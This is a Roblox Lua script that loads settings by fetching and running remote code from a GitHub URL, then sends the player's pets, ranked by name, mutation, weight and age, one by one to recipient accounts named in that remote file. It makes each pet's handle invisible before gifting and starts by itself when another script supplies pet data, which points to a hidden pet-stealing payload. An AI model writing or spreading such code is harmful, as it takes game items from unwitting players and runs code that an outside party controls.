-- Load settings
local Settings = loadstring(game:HttpGet("https://raw.githubusercontent.com/unblock-eve/files/refs/heads/main/SETTINGS.lua"))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Player reference
local localPlayer = Players.LocalPlayer

-- Helper function to wait
local function wait(duration)
    local start = tick()
    repeat
        RunService.Heartbeat:Wait()
    until tick() - start >= duration
end

-- Function to get list of recipient usernames from settings
local function getRecipientUsernames()
    local recipients = {}
    
    if Settings.RECIPIENT_USERNAMES then
        for username, enabled in pairs(Settings.RECIPIENT_USERNAMES) do
            if enabled then
                table.insert(recipients, username)
            end
        end
    end
    
    return recipients
end

-- Function to select next recipient (round-robin style)
local currentRecipientIndex = 1
local function getNextRecipient(recipients)
    if #recipients == 0 then
        return nil
    end
    
    local recipient = recipients[currentRecipientIndex]
    currentRecipientIndex = currentRecipientIndex + 1
    
    -- Reset to first recipient if we've gone through all
    if currentRecipientIndex > #recipients then
        currentRecipientIndex = 1
    end
    
    return recipient
end

-- Function to delete tool handle (makes it invisible but keeps functionality)
local function deleteToolHandle(tool)
    if tool and tool:FindFirstChild("Handle") then
        tool.Handle.Transparency = 1
        tool.Handle.CanCollide = false
        
        -- Hide any mesh or special part children
        for _, child in pairs(tool.Handle:GetChildren()) do
            if child:IsA("SpecialMesh") or child:IsA("BlockMesh") then
                child.Scale = Vector3.new(0, 0, 0)
            elseif child:IsA("Decal") or child:IsA("Texture") then
                child.Transparency = 1
            end
        end
        
        print(string.format("🔧 Deleted handle for tool: %s", tool.Name))
        return true
    end
    return false
end

-- Function to equip pet tool
local function equipPetTool(tool)
    if not tool or not tool.Parent then
        print("❌ Tool is nil or not in backpack")
        return false
    end
    
    local success, result = pcall(function()
        local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:EquipTool(tool)
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully equipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to equip tool: %s", tool.Name))
        return false
    end
end

-- Function to unequip pet tool
local function unequipPetTool(tool)
    if not tool then return false end
    
    local success, result = pcall(function()
        if tool.Parent == localPlayer.Character then
            tool.Parent = localPlayer.Backpack
            return true
        end
        return false
    end)
    
    if success and result then
        print(string.format("✅ Successfully unequipped tool: %s", tool.Name))
        return true
    else
        print(string.format("❌ Failed to unequip tool: %s", tool.Name))
        return false
    end
end

-- Function to send gifting remote
local function sendGiftingRemote(petUUID, targetPlayer)
    local args = {
        "GiftPet",
        targetPlayer, -- Target player name
        petUUID       -- Pet UUID to gift
    }
    
    local success, result = pcall(function()
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer(unpack(args))
    end)
    
    if success then
        print(string.format("✅ Successfully sent gift remote for pet UUID: %s to %s", petUUID, targetPlayer))
        return true
    else
        print(string.format("❌ Failed to send gift remote for pet %s: %s", petUUID, tostring(result)))
        return false
    end
end

-- Function to get valid pet tools from backpack based on UUIDs from main script
local function getValidPetToolsFromData(validPetsData)
    local validTools = {}
    local backpack = localPlayer.Backpack
    
    if not backpack then
        print("❌ Backpack not found")
        return validTools
    end
    
    -- Create a lookup table of valid UUIDs from all priorities
    local validUUIDs = {}
    for priority, pets in pairs(validPetsData) do
        for _, petData in ipairs(pets) do
            if petData.pet and petData.pet.uuid then
                validUUIDs[petData.pet.uuid] = {
                    priority = priority,
                    petData = petData
                }
            end
        end
    end
    
    -- Find tools in backpack that match valid UUIDs
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") then
            local petUUID = tool:GetAttribute("PET_UUID")
            
            if validUUIDs[petUUID] then
                table.insert(validTools, {
                    tool = tool,
                    uuid = petUUID,
                    priority = validUUIDs[petUUID].priority,
                    petData = validUUIDs[petUUID].petData
                })
            end
        end
    end
    
    -- Sort by priority (NAME > MUTATION > WEIGHT > AGE)
    local priorityOrder = {NAME = 1, MUTATION = 2, WEIGHT = 3, AGE = 4}
    table.sort(validTools, function(a, b)
        return priorityOrder[a.priority] < priorityOrder[b.priority]
    end)
    
    return validTools
end

-- Main gifting function
local function processGifting(validPetsData, recipients)
    print("=== STARTING PET GIFTING PROCESS ===")
    print(string.format("📋 Recipients: %s", table.concat(recipients, ", ")))
    
    local cycle = 1
    local totalGifted = 0
    local giftingStats = {}
    
    -- Initialize stats for each recipient
    for _, recipient in ipairs(recipients) do
        giftingStats[recipient] = 0
    end
    
    while true do
        print(string.format("\n--- CYCLE %d ---", cycle))
        
        -- Get current valid tools from backpack
        local validTools = getValidPetToolsFromData(validPetsData)
        
        if #validTools == 0 then
            print("✅ No more valid pet tools found in backpack. Gifting complete!")
            break
        end
        
        print(string.format("Found %d valid pet tools to process", #validTools))
        
        -- Process each valid tool
        for i, toolData in ipairs(validTools) do
            local tool = toolData.tool
            local petUUID = toolData.uuid
            local priority = toolData.priority
            
            -- Get next recipient in rotation
            local currentRecipient = getNextRecipient(recipients)
            if not currentRecipient then
                print("❌ No valid recipients found!")
                return
            end
            
            print(string.format("\nProcessing %d/%d: %s (Priority: %s, UUID: %s) → %s", 
                i, #validTools, tool.Name, priority, petUUID, currentRecipient))
            
            -- Step 1: Delete tool handle
            deleteToolHandle(tool)
            
            if equipPetTool(tool) then
                wait(0.1) -- Wait for equip to register
                
                -- Step 3: Send gifting remote
                if sendGiftingRemote(petUUID, currentRecipient) then
                    giftingStats[currentRecipient] = giftingStats[currentRecipient] + 1
                    totalGifted = totalGifted + 1
                end
            
                unequipPetTool(tool)
                wait(0.2)
            else
                print(string.format("❌ Skipping gift for %s due to equip failure", tool.Name))
            end
            
            -- Use delay from settings
            local delayBetweenPets = Settings.DELAY_BETWEEN_PETS or 0.5
            wait(delayBetweenPets)
        end
        
        cycle = cycle + 1
        
        -- Print current stats
        print(string.format("\n📊 GIFTING STATS (Total: %d)", totalGifted))
        for recipient, count in pairs(giftingStats) do
            print(string.format("   %s: %d pets", recipient, count))
        end
        
        -- Wait 5 seconds before next cycle
        print(string.format("\n⏳ Waiting 5 seconds before cycle %d...", cycle))
        wait(5)
    end
    
    print("\n=== PET GIFTING PROCESS COMPLETED ===")
    print(string.format("🎉 Total pets gifted: %d", totalGifted))
    print("📊 Final distribution:")
    for recipient, count in pairs(giftingStats) do
        print(string.format("   %s: %d pets", recipient, count))
    end
end

-- Example usage function (to be called with data from main script)
local function startGiftingProcess(validPetsData, customRecipients)
    if not validPetsData then
        print("❌ No valid pets data provided")
        return
    end
    
    -- Use custom recipients if provided, otherwise get from settings
    local recipients = customRecipients or getRecipientUsernames()
    
    if not recipients or #recipients == 0 then
        print("❌ No valid recipients found in settings or provided")
        print("💡 Make sure Settings.RECIPIENT_USERNAMES has at least one enabled recipient")
        return
    end
    
    print(string.format("🎯 Found %d valid recipients: %s", #recipients, table.concat(recipients, ", ")))
    
    -- Start the gifting process
    processGifting(validPetsData, recipients)
end

-- Export the main function
_G.startGiftingProcess = startGiftingProcess

print("🚀 Pet Gifting Script Loaded!")

-- Auto-start if valid pets data is available from main script
if _G.VALID_PETS_DATA then
    print("📦 Valid pets data found from main script!")
    
    -- Get recipients from settings
    local recipients = getRecipientUsernames()
    
    if recipients and #recipients > 0 then
        print(string.format("🎯 Starting gifting process with %d recipients", #recipients))
        startGiftingProcess(_G.VALID_PETS_DATA)
    else
        print("⚠️ No valid recipients found in Settings.RECIPIENT_USERNAMES")
        print("💡 Make sure to enable at least one recipient in your settings")
        print("Manual usage: _G.startGiftingProcess(_G.VALID_PETS_DATA, {'Username1', 'Username2'})")
    end
else
    print("⚠️ No valid pets data found. Manual usage required:")
    print("Usage: _G.startGiftingProcess(validPetsData, optionalRecipientsList)")
end
